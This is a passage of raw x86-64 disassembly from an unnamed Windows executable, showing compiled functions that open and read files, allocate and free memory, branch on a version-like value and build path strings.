   14000345d:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140003464:	00 
   140003465:	b8 02 00 00 00       	mov    $0x2,%eax
   14000346a:	44 0f 45 c0          	cmovne %eax,%r8d
   14000346e:	ff 15 d4 9b 02 00    	call   *0x29bd4(%rip)        # 0x14002d048
   140003474:	84 c0                	test   %al,%al
   140003476:	75 2b                	jne    0x1400034a3
   140003478:	83 3d 81 cb 03 00 00 	cmpl   $0x0,0x3cb81(%rip)        # 0x140040000
   14000347f:	74 26                	je     0x1400034a7
   140003481:	ff 15 91 9c 02 00    	call   *0x29c91(%rip)        # 0x14002d118
   140003487:	83 f8 57             	cmp    $0x57,%eax
   14000348a:	75 1b                	jne    0x1400034a7
   14000348c:	48 8b d3             	mov    %rbx,%rdx
   14000348f:	c7 05 67 cb 03 00 00 	movl   $0x0,0x3cb67(%rip)        # 0x140040000
   140003496:	00 00 00 
   140003499:	48 8b cf             	mov    %rdi,%rcx
   14000349c:	e8 4f ff ff ff       	call   0x1400033f0
   1400034a1:	eb 09                	jmp    0x1400034ac
   1400034a3:	33 c0                	xor    %eax,%eax
   1400034a5:	eb 05                	jmp    0x1400034ac
   1400034a7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400034ac:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400034b3:	00 
   1400034b4:	48 33 cc             	xor    %rsp,%rcx
   1400034b7:	e8 e4 7f 00 00       	call   0x14000b4a0
   1400034bc:	48 8b 9c 24 50 40 00 	mov    0x4050(%rsp),%rbx
   1400034c3:	00 
   1400034c4:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400034cb:	5f                   	pop    %rdi
   1400034cc:	c3                   	ret
   1400034cd:	cc                   	int3
   1400034ce:	cc                   	int3
   1400034cf:	cc                   	int3
   1400034d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400034d5:	55                   	push   %rbp
   1400034d6:	56                   	push   %rsi
   1400034d7:	57                   	push   %rdi
   1400034d8:	b8 70 40 00 00       	mov    $0x4070,%eax
   1400034dd:	e8 5e 7f 00 00       	call   0x14000b440
   1400034e2:	48 2b e0             	sub    %rax,%rsp
   1400034e5:	48 8b 05 54 cb 03 00 	mov    0x3cb54(%rip),%rax        # 0x140040040
   1400034ec:	48 33 c4             	xor    %rsp,%rax
   1400034ef:	48 89 84 24 60 40 00 	mov    %rax,0x4060(%rsp)
   1400034f6:	00 
   1400034f7:	48 8b ea             	mov    %rdx,%rbp
   1400034fa:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003500:	48 8b d1             	mov    %rcx,%rdx
   140003503:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   14000350a:	00 
   14000350b:	e8 60 4d 00 00       	call   0x140008270
   140003510:	33 db                	xor    %ebx,%ebx
   140003512:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140003519:	00 
   14000351a:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000351f:	45 33 c9             	xor    %r9d,%r9d
   140003522:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140003529:	00 
   14000352a:	33 d2                	xor    %edx,%edx
   14000352c:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140003533:	00 
   140003534:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140003538:	ff 15 ea 9a 02 00    	call   *0x29aea(%rip)        # 0x14002d028
   14000353e:	48 8b f8             	mov    %rax,%rdi
   140003541:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003545:	74 72                	je     0x1400035b9
   140003547:	45 33 c9             	xor    %r9d,%r9d
   14000354a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000354f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003555:	48 8b c8             	mov    %rax,%rcx
   140003558:	ff 15 d2 9a 02 00    	call   *0x29ad2(%rip)        # 0x14002d030
   14000355e:	48 8b cf             	mov    %rdi,%rcx
   140003561:	8b f0                	mov    %eax,%esi
   140003563:	ff 15 cf 9a 02 00    	call   *0x29acf(%rip)        # 0x14002d038
   140003569:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000356c:	3d fe 0f 00 00       	cmp    $0xffe,%eax
   140003571:	77 46                	ja     0x1400035b9
   140003573:	8b fb                	mov    %ebx,%edi
   140003575:	83 fe 04             	cmp    $0x4,%esi
   140003578:	72 1e                	jb     0x140003598
   14000357a:	be 04 00 00 00       	mov    $0x4,%esi
   14000357f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003584:	44 8b c6             	mov    %esi,%r8d
   140003587:	48 8d 0d e2 a8 02 00 	lea    0x2a8e2(%rip),%rcx        # 0x14002de70
   14000358e:	e8 65 33 01 00       	call   0x1400168f8
   140003593:	85 c0                	test   %eax,%eax
   140003595:	0f 44 fe             	cmove  %esi,%edi
   140003598:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000359d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400035a3:	48 8d 14 7a          	lea    (%rdx,%rdi,2),%rdx
   1400035a7:	48 8b cd             	mov    %rbp,%rcx
   1400035aa:	e8 d1 4d 00 00       	call   0x140008380
   1400035af:	48 85 c0             	test   %rax,%rax
   1400035b2:	0f 95 c3             	setne  %bl
   1400035b5:	8b c3                	mov    %ebx,%eax
   1400035b7:	eb 02                	jmp    0x1400035bb
   1400035b9:	33 c0                	xor    %eax,%eax
   1400035bb:	48 8b 8c 24 60 40 00 	mov    0x4060(%rsp),%rcx
   1400035c2:	00 
   1400035c3:	48 33 cc             	xor    %rsp,%rcx
   1400035c6:	e8 d5 7e 00 00       	call   0x14000b4a0
   1400035cb:	48 8b 9c 24 a0 40 00 	mov    0x40a0(%rsp),%rbx
   1400035d2:	00 
   1400035d3:	48 81 c4 70 40 00 00 	add    $0x4070,%rsp
   1400035da:	5f                   	pop    %rdi
   1400035db:	5e                   	pop    %rsi
   1400035dc:	5d                   	pop    %rbp
   1400035dd:	c3                   	ret
   1400035de:	cc                   	int3
   1400035df:	cc                   	int3
   1400035e0:	40 53                	rex push %rbx
   1400035e2:	b8 40 20 00 00       	mov    $0x2040,%eax
   1400035e7:	e8 54 7e 00 00       	call   0x14000b440
   1400035ec:	48 2b e0             	sub    %rax,%rsp
   1400035ef:	48 8b 05 4a ca 03 00 	mov    0x3ca4a(%rip),%rax        # 0x140040040
   1400035f6:	48 33 c4             	xor    %rsp,%rax
   1400035f9:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140003600:	00 
   140003601:	48 8b da             	mov    %rdx,%rbx
   140003604:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000360a:	48 8b d1             	mov    %rcx,%rdx
   14000360d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003612:	e8 31 44 01 00       	call   0x140017a48
   140003617:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000361c:	e8 27 4b 01 00       	call   0x140018148
   140003621:	48 89 03             	mov    %rax,(%rbx)
   140003624:	48 f7 d8             	neg    %rax
   140003627:	1b c0                	sbb    %eax,%eax
   140003629:	f7 d8                	neg    %eax
   14000362b:	ff c8                	dec    %eax
   14000362d:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140003634:	00 
   140003635:	48 33 cc             	xor    %rsp,%rcx
   140003638:	e8 63 7e 00 00       	call   0x14000b4a0
   14000363d:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140003644:	5b                   	pop    %rbx
   140003645:	c3                   	ret
   140003646:	cc                   	int3
   140003647:	cc                   	int3
   140003648:	cc                   	int3
   140003649:	cc                   	int3
   14000364a:	cc                   	int3
   14000364b:	cc                   	int3
   14000364c:	cc                   	int3
   14000364d:	cc                   	int3
   14000364e:	cc                   	int3
   14000364f:	cc                   	int3
   140003650:	40 53                	rex push %rbx
   140003652:	48 83 ec 50          	sub    $0x50,%rsp
   140003656:	44 8b 0d a7 d6 03 00 	mov    0x3d6a7(%rip),%r9d        # 0x140040d04
   14000365d:	4d 8b d0             	mov    %r8,%r10
   140003660:	48 8b d9             	mov    %rcx,%rbx
   140003663:	41 81 e9 34 01 00 00 	sub    $0x134,%r9d
   14000366a:	0f 84 95 00 00 00    	je     0x140003705
   140003670:	41 83 e9 01          	sub    $0x1,%r9d
   140003674:	0f 84 8b 00 00 00    	je     0x140003705
   14000367a:	41 83 e9 01          	sub    $0x1,%r9d
   14000367e:	74 4e                	je     0x1400036ce
   140003680:	41 83 e9 01          	sub    $0x1,%r9d
   140003684:	74 11                	je     0x140003697
   140003686:	41 83 f9 01          	cmp    $0x1,%r9d
   14000368a:	74 0b                	je     0x140003697
   14000368c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003691:	48 83 c4 50          	add    $0x50,%rsp
   140003695:	5b                   	pop    %rbx
   140003696:	c3                   	ret
   140003697:	48 8b 05 ca d6 03 00 	mov    0x3d6ca(%rip),%rax        # 0x140040d68
   14000369e:	4c 8d 81 38 01 00 00 	lea    0x138(%rcx),%r8
   1400036a5:	4c 63 ca             	movslq %edx,%r9
   1400036a8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400036ad:	48 8b d3             	mov    %rbx,%rdx
   1400036b0:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400036b5:	ff 15 d5 9c 02 00    	call   *0x29cd5(%rip)        # 0x14002d390
   1400036bb:	0f 10 00             	movups (%rax),%xmm0
   1400036be:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400036c2:	c7 83 30 01 00 00 01 	movl   $0x1,0x130(%rbx)
   1400036c9:	00 00 00 
   1400036cc:	eb 6c                	jmp    0x14000373a
   1400036ce:	48 8b 05 93 d6 03 00 	mov    0x3d693(%rip),%rax        # 0x140040d68
   1400036d5:	4c 8d 81 20 01 00 00 	lea    0x120(%rcx),%r8
   1400036dc:	4c 63 ca             	movslq %edx,%r9
   1400036df:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400036e4:	48 8b d3             	mov    %rbx,%rdx
   1400036e7:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400036ec:	ff 15 9e 9c 02 00    	call   *0x29c9e(%rip)        # 0x14002d390
   1400036f2:	0f 10 00             	movups (%rax),%xmm0
   1400036f5:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400036f9:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%rbx)
   140003700:	00 00 00 
   140003703:	eb 35                	jmp    0x14000373a
   140003705:	48 8b 05 5c d6 03 00 	mov    0x3d65c(%rip),%rax        # 0x140040d68
   14000370c:	4c 8d 81 00 01 00 00 	lea    0x100(%rcx),%r8
   140003713:	4c 63 ca             	movslq %edx,%r9
   140003716:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000371b:	48 8b d3             	mov    %rbx,%rdx
   14000371e:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003723:	ff 15 67 9c 02 00    	call   *0x29c67(%rip)        # 0x14002d390
   140003729:	0f 10 00             	movups (%rax),%xmm0
   14000372c:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003730:	c7 83 f8 00 00 00 01 	movl   $0x1,0xf8(%rbx)
   140003737:	00 00 00 
   14000373a:	48 8b 05 d7 d6 03 00 	mov    0x3d6d7(%rip),%rax        # 0x140040e18
   140003741:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003746:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   14000374b:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140003750:	ff 15 3a 9c 02 00    	call   *0x29c3a(%rip)        # 0x14002d390
   140003756:	f7 d8                	neg    %eax
   140003758:	1b c0                	sbb    %eax,%eax
   14000375a:	48 83 c4 50          	add    $0x50,%rsp
   14000375e:	5b                   	pop    %rbx
   14000375f:	c3                   	ret
   140003760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003765:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000376a:	57                   	push   %rdi
   14000376b:	48 83 ec 70          	sub    $0x70,%rsp
   14000376f:	49 8b c0             	mov    %r8,%rax
   140003772:	48 8b fa             	mov    %rdx,%rdi
   140003775:	48 8b f1             	mov    %rcx,%rsi
   140003778:	48 8b d0             	mov    %rax,%rdx
   14000377b:	45 33 c0             	xor    %r8d,%r8d
   14000377e:	33 c9                	xor    %ecx,%ecx
   140003780:	e8 eb 4a 00 00       	call   0x140008270
   140003785:	48 8b d8             	mov    %rax,%rbx
   140003788:	48 85 c0             	test   %rax,%rax
   14000378b:	75 15                	jne    0x1400037a2
   14000378d:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140003790:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003795:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003799:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000379d:	49 8b e3             	mov    %r11,%rsp
   1400037a0:	5f                   	pop    %rdi
   1400037a1:	c3                   	ret
   1400037a2:	48 8b 05 b7 d5 03 00 	mov    0x3d5b7(%rip),%rax        # 0x140040d60
   1400037a9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400037ae:	4c 8b cb             	mov    %rbx,%r9
   1400037b1:	4c 8b c7             	mov    %rdi,%r8
   1400037b4:	48 8b d6             	mov    %rsi,%rdx
   1400037b7:	ff 15 d3 9b 02 00    	call   *0x29bd3(%rip)        # 0x14002d390
   1400037bd:	48 8b cb             	mov    %rbx,%rcx
   1400037c0:	0f 10 00             	movups (%rax),%xmm0
   1400037c3:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400037c8:	0f 10 40 10          	movups 0x10(%rax),%xmm0
   1400037cc:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400037d1:	e8 32 21 01 00       	call   0x140015908
   1400037d6:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400037db:	48 8b 05 36 d6 03 00 	mov    0x3d636(%rip),%rax        # 0x140040e18
   1400037e2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400037e7:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   1400037ec:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1400037f1:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   1400037f6:	ff 15 94 9b 02 00    	call   *0x29b94(%rip)        # 0x14002d390
   1400037fc:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003801:	f7 d8                	neg    %eax
   140003803:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003807:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000380b:	1b c0                	sbb    %eax,%eax
   14000380d:	49 8b e3             	mov    %r11,%rsp
   140003810:	5f                   	pop    %rdi
   140003811:	c3                   	ret
   140003812:	cc                   	int3
   140003813:	cc                   	int3
   140003814:	cc                   	int3
   140003815:	cc                   	int3
   140003816:	cc                   	int3
   140003817:	cc                   	int3
   140003818:	cc                   	int3
   140003819:	cc                   	int3
   14000381a:	cc                   	int3
   14000381b:	cc                   	int3
   14000381c:	cc                   	int3
   14000381d:	cc                   	int3
   14000381e:	cc                   	int3
   14000381f:	cc                   	int3
   140003820:	8b 0d de d4 03 00    	mov    0x3d4de(%rip),%ecx        # 0x140040d04
   140003826:	81 e9 34 01 00 00    	sub    $0x134,%ecx
   14000382c:	74 44                	je     0x140003872
   14000382e:	83 e9 01             	sub    $0x1,%ecx
   140003831:	74 30                	je     0x140003863
   140003833:	83 e9 01             	sub    $0x1,%ecx
   140003836:	74 1c                	je     0x140003854
   140003838:	83 e9 01             	sub    $0x1,%ecx
   14000383b:	74 08                	je     0x140003845
   14000383d:	83 f9 01             	cmp    $0x1,%ecx
   140003840:	74 03                	je     0x140003845
   140003842:	33 c0                	xor    %eax,%eax
   140003844:	c3                   	ret
   140003845:	ba b0 01 00 00       	mov    $0x1b0,%edx
   14000384a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000384f:	e9 ac 20 01 00       	jmp    0x140015900
   140003854:	ba 90 01 00 00       	mov    $0x190,%edx
   140003859:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000385e:	e9 9d 20 01 00       	jmp    0x140015900
   140003863:	ba 88 01 00 00       	mov    $0x188,%edx
   140003868:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000386d:	e9 8e 20 01 00       	jmp    0x140015900
   140003872:	ba 68 01 00 00       	mov    $0x168,%edx
   140003877:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000387c:	e9 7f 20 01 00       	jmp    0x140015900
   140003881:	cc                   	int3
   140003882:	cc                   	int3
   140003883:	cc                   	int3
   140003884:	cc                   	int3
   140003885:	cc                   	int3
   140003886:	cc                   	int3
   140003887:	cc                   	int3
   140003888:	cc                   	int3
   140003889:	cc                   	int3
   14000388a:	cc                   	int3
   14000388b:	cc                   	int3
   14000388c:	cc                   	int3
   14000388d:	cc                   	int3
   14000388e:	cc                   	int3
   14000388f:	cc                   	int3
   140003890:	40 53                	rex push %rbx
   140003892:	48 83 ec 20          	sub    $0x20,%rsp
   140003896:	48 8b 05 a3 d4 03 00 	mov    0x3d4a3(%rip),%rax        # 0x140040d40
   14000389d:	48 8b d9             	mov    %rcx,%rbx
   1400038a0:	ff 15 ea 9a 02 00    	call   *0x29aea(%rip)        # 0x14002d390
   1400038a6:	48 8b cb             	mov    %rbx,%rcx
   1400038a9:	48 83 c4 20          	add    $0x20,%rsp
   1400038ad:	5b                   	pop    %rbx
   1400038ae:	e9 55 20 01 00       	jmp    0x140015908
   1400038b3:	cc                   	int3
   1400038b4:	cc                   	int3
   1400038b5:	cc                   	int3
   1400038b6:	cc                   	int3
   1400038b7:	cc                   	int3
   1400038b8:	cc                   	int3
   1400038b9:	cc                   	int3
   1400038ba:	cc                   	int3
   1400038bb:	cc                   	int3
   1400038bc:	cc                   	int3
   1400038bd:	cc                   	int3
   1400038be:	cc                   	int3
   1400038bf:	cc                   	int3
   1400038c0:	40 53                	rex push %rbx
   1400038c2:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1400038c9:	48 8b 05 70 c7 03 00 	mov    0x3c770(%rip),%rax        # 0x140040040
   1400038d0:	48 33 c4             	xor    %rsp,%rax
   1400038d3:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400038da:	00 
   1400038db:	48 8b 05 26 d5 03 00 	mov    0x3d526(%rip),%rax        # 0x140040e08
   1400038e2:	48 8b d9             	mov    %rcx,%rbx
   1400038e5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400038ea:	ff 15 a0 9a 02 00    	call   *0x29aa0(%rip)        # 0x14002d390
   1400038f0:	8b 43 14             	mov    0x14(%rbx),%eax
   1400038f3:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400038f8:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   1400038ff:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003904:	8b 43 18             	mov    0x18(%rbx),%eax
   140003907:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   14000390e:	48 8b 05 23 d4 03 00 	mov    0x3d423(%rip),%rax        # 0x140040d38
   140003915:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   14000391c:	00 
   14000391d:	ff 15 6d 9a 02 00    	call   *0x29a6d(%rip)        # 0x14002d390
   140003923:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003928:	0f 10 00             	movups (%rax),%xmm0
   14000392b:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000392f:	48 8b 05 e2 d4 03 00 	mov    0x3d4e2(%rip),%rax        # 0x140040e18
   140003936:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   14000393b:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140003940:	ff 15 4a 9a 02 00    	call   *0x29a4a(%rip)        # 0x14002d390
   140003946:	f7 d8                	neg    %eax
   140003948:	1b c0                	sbb    %eax,%eax
   14000394a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140003951:	00 
   140003952:	48 33 cc             	xor    %rsp,%rcx
   140003955:	e8 46 7b 00 00       	call   0x14000b4a0
   14000395a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140003961:	5b                   	pop    %rbx
   140003962:	c3                   	ret
   140003963:	cc                   	int3
   140003964:	cc                   	int3
   140003965:	cc                   	int3
   140003966:	cc                   	int3
   140003967:	cc                   	int3
   140003968:	cc                   	int3
   140003969:	cc                   	int3
   14000396a:	cc                   	int3
   14000396b:	cc                   	int3
   14000396c:	cc                   	int3
   14000396d:	cc                   	int3
   14000396e:	cc                   	int3
   14000396f:	cc                   	int3
   140003970:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003975:	55                   	push   %rbp
   140003976:	56                   	push   %rsi
   140003977:	41 55                	push   %r13
   140003979:	41 56                	push   %r14
   14000397b:	41 57                	push   %r15
   14000397d:	48 83 ec 70          	sub    $0x70,%rsp
   140003981:	33 db                	xor    %ebx,%ebx
   140003983:	4c 8b e9             	mov    %rcx,%r13
   140003986:	48 63 8a 7c 50 00 00 	movslq 0x507c(%rdx),%rcx
   14000398d:	48 8b ea             	mov    %rdx,%rbp
   140003990:	8b f3                	mov    %ebx,%esi
   140003992:	8d 53 08             	lea    0x8(%rbx),%edx
   140003995:	e8 66 1f 01 00       	call   0x140015900
   14000399a:	4c 8b f8             	mov    %rax,%r15
   14000399d:	48 85 c0             	test   %rax,%rax
   1400039a0:	75 08                	jne    0x1400039aa
   1400039a2:	8d 43 ff             	lea    -0x1(%rbx),%eax
   1400039a5:	e9 13 01 00 00       	jmp    0x140003abd
   1400039aa:	8b 95 7c 50 00 00    	mov    0x507c(%rbp),%edx
   1400039b0:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   1400039b6:	48 89 bc 24 a0 00 00 	mov    %rdi,0xa0(%rsp)
   1400039bd:	00 
   1400039be:	4c 89 a4 24 a8 00 00 	mov    %r12,0xa8(%rsp)
   1400039c5:	00 
   1400039c6:	44 8b e3             	mov    %ebx,%r12d
   1400039c9:	85 d2                	test   %edx,%edx
   1400039cb:	7e 3a                	jle    0x140003a07
   1400039cd:	48 8b fb             	mov    %rbx,%rdi
   1400039d0:	48 8b 95 80 50 00 00 	mov    0x5080(%rbp),%rdx
   1400039d7:	45 33 c0             	xor    %r8d,%r8d
   1400039da:	33 c9                	xor    %ecx,%ecx
   1400039dc:	48 8b 14 17          	mov    (%rdi,%rdx,1),%rdx
   1400039e0:	e8 8b 48 00 00       	call   0x140008270
   1400039e5:	48 85 c0             	test   %rax,%rax
   1400039e8:	4a 89 04 3f          	mov    %rax,(%rdi,%r15,1)
   1400039ec:	8b 95 7c 50 00 00    	mov    0x507c(%rbp),%edx
   1400039f2:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   1400039f6:	41 0f 44 f6          	cmove  %r14d,%esi
   1400039fa:	41 ff c4             	inc    %r12d
   1400039fd:	44 3b e2             	cmp    %edx,%r12d
   140003a00:	7c ce                	jl     0x1400039d0
   140003a02:	41 3b f6             	cmp    %r14d,%esi
   140003a05:	7c 7b                	jl     0x140003a82
   140003a07:	8b 0d f7 d2 03 00    	mov    0x3d2f7(%rip),%ecx        # 0x140040d04
   140003a0d:	81 e9 34 01 00 00    	sub    $0x134,%ecx
   140003a13:	74 25                	je     0x140003a3a
   140003a15:	83 e9 01             	sub    $0x1,%ecx
   140003a18:	74 20                	je     0x140003a3a
   140003a1a:	83 e9 01             	sub    $0x1,%ecx
   140003a1d:	74 15                	je     0x140003a34
   140003a1f:	83 e9 01             	sub    $0x1,%ecx
   140003a22:	74 0a                	je     0x140003a2e
   140003a24:	83 f9 01             	cmp    $0x1,%ecx
   140003a27:	74 05                	je     0x140003a2e
   140003a29:	41 8b f6             	mov    %r14d,%esi
   140003a2c:	eb 54                	jmp    0x140003a82
   140003a2e:	4d 8d 45 78          	lea    0x78(%r13),%r8
   140003a32:	eb 0a                	jmp    0x140003a3e
   140003a34:	4d 8d 45 68          	lea    0x68(%r13),%r8
   140003a38:	eb 04                	jmp    0x140003a3e
   140003a3a:	4d 8d 45 58          	lea    0x58(%r13),%r8
   140003a3e:	48 8b 05 23 d3 03 00 	mov    0x3d323(%rip),%rax        # 0x140040d68
   140003a45:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003a4a:	4c 63 ca             	movslq %edx,%r9
   140003a4d:	49 8b d5             	mov    %r13,%rdx
   140003a50:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003a55:	ff 15 35 99 02 00    	call   *0x29935(%rip)        # 0x14002d390
   140003a5b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003a60:	0f 10 00             	movups (%rax),%xmm0
   140003a63:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003a67:	48 8b 05 aa d3 03 00 	mov    0x3d3aa(%rip),%rax        # 0x140040e18
   140003a6e:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140003a73:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140003a78:	ff 15 12 99 02 00    	call   *0x29912(%rip)        # 0x14002d390
   140003a7e:	f7 d8                	neg    %eax
   140003a80:	1b f6                	sbb    %esi,%esi
   140003a82:	4c 8b a4 24 a8 00 00 	mov    0xa8(%rsp),%r12
   140003a89:	00 
   140003a8a:	39 9d 7c 50 00 00    	cmp    %ebx,0x507c(%rbp)
   140003a90:	7e 19                	jle    0x140003aab
   140003a92:	49 8b ff             	mov    %r15,%rdi
   140003a95:	48 8b 0f             	mov    (%rdi),%rcx
   140003a98:	e8 6b 1e 01 00       	call   0x140015908
   140003a9d:	ff c3                	inc    %ebx
   140003a9f:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140003aa3:	3b 9d 7c 50 00 00    	cmp    0x507c(%rbp),%ebx
   140003aa9:	7c ea                	jl     0x140003a95
   140003aab:	49 8b cf             	mov    %r15,%rcx
   140003aae:	e8 55 1e 01 00       	call   0x140015908
   140003ab3:	48 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%rdi
   140003aba:	00 
   140003abb:	8b c6                	mov    %esi,%eax
   140003abd:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   140003ac4:	00 
   140003ac5:	48 83 c4 70          	add    $0x70,%rsp
   140003ac9:	41 5f                	pop    %r15
   140003acb:	41 5e                	pop    %r14
   140003acd:	41 5d                	pop    %r13
   140003acf:	5e                   	pop    %rsi
   140003ad0:	5d                   	pop    %rbp
   140003ad1:	c3                   	ret
   140003ad2:	cc                   	int3
   140003ad3:	cc                   	int3
   140003ad4:	cc                   	int3
   140003ad5:	cc                   	int3
   140003ad6:	cc                   	int3
   140003ad7:	cc                   	int3
   140003ad8:	cc                   	int3
   140003ad9:	cc                   	int3
   140003ada:	cc                   	int3
   140003adb:	cc                   	int3
   140003adc:	cc                   	int3
   140003add:	cc                   	int3
   140003ade:	cc                   	int3
   140003adf:	cc                   	int3
   140003ae0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003ae5:	57                   	push   %rdi
   140003ae6:	b8 80 20 00 00       	mov    $0x2080,%eax
   140003aeb:	e8 50 79 00 00       	call   0x14000b440
   140003af0:	48 2b e0             	sub    %rax,%rsp
   140003af3:	48 8b 05 46 c5 03 00 	mov    0x3c546(%rip),%rax        # 0x140040040
   140003afa:	48 33 c4             	xor    %rsp,%rax
   140003afd:	48 89 84 24 70 20 00 	mov    %rax,0x2070(%rsp)
   140003b04:	00 
   140003b05:	48 8d 9a 70 40 00 00 	lea    0x4070(%rdx),%rbx
   140003b0c:	48 8b f9             	mov    %rcx,%rdi
   140003b0f:	48 8d 05 22 a4 02 00 	lea    0x2a422(%rip),%rax        # 0x14002df38
   140003b16:	4c 8b cb             	mov    %rbx,%r9
   140003b19:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003b1e:	4c 8d 05 5f 9d 02 00 	lea    0x29d5f(%rip),%r8        # 0x14002d884
   140003b25:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003b2a:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140003b31:	00 
   140003b32:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003b37:	e8 a4 e3 ff ff       	call   0x140001ee0
   140003b3c:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003b41:	0f 8d a1 00 00 00    	jge    0x140003be8
   140003b47:	48 8d 05 02 a4 02 00 	lea    0x2a402(%rip),%rax        # 0x14002df50
   140003b4e:	4c 8b cb             	mov    %rbx,%r9
   140003b51:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003b56:	4c 8d 05 27 9d 02 00 	lea    0x29d27(%rip),%r8        # 0x14002d884
   140003b5d:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003b62:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140003b69:	00 
   140003b6a:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140003b71:	00 
   140003b72:	e8 69 e3 ff ff       	call   0x140001ee0
   140003b77:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003b7c:	7d 6a                	jge    0x140003be8
   140003b7e:	45 33 c0             	xor    %r8d,%r8d
   140003b81:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003b86:	33 c9                	xor    %ecx,%ecx
   140003b88:	e8 e3 46 00 00       	call   0x140008270
